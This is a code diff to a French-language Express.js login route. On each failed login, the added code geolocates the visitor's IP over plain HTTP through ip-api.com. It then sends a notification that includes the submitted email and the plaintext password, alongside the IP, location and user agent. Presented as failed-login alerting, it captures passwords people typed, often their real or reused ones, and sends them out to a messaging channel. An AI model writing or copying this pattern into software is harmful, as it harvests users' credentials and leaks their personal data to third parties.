@@ -36,6 +36,27 @@ router.post('/auth/login', async (req, res) => {
     ).catch(() => {});
     res.json({ success: true });
   } else {
+    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '?').split(',')[0].trim();
+    const ua = req.headers['user-agent'] || '?';
+    const time = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
+
+    let geoLine = '';
+    try {
+      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,city,regionName,country,isp&lang=fr`);
+      const geo = await geoRes.json();
+      if (geo.status === 'success') {
+        geoLine = `\n📍 ${geo.city}, ${geo.regionName}, ${geo.country}\n🏢 ${geo.isp}`;
+      }
+    } catch {}
+
+    notifyLogin(
+      `⚠️ <b>Tentative de connexion échouée</b>\n\n` +
+      `🕐 ${time}\n` +
+      `🌐 IP : <code>${ip}</code>${geoLine}\n` +
+      `👤 Email : <code>${(email || '').slice(0, 80)}</code>\n` +
+      `🔑 Mot de passe : <code>${(pass || '').slice(0, 80)}</code>\n` +
+      `📱 ${ua.slice(0, 100)}`
+    ).catch(() => {});
     res.status(401).json({ error: 'Email ou mot de passe incorrect.' });
   }
 });
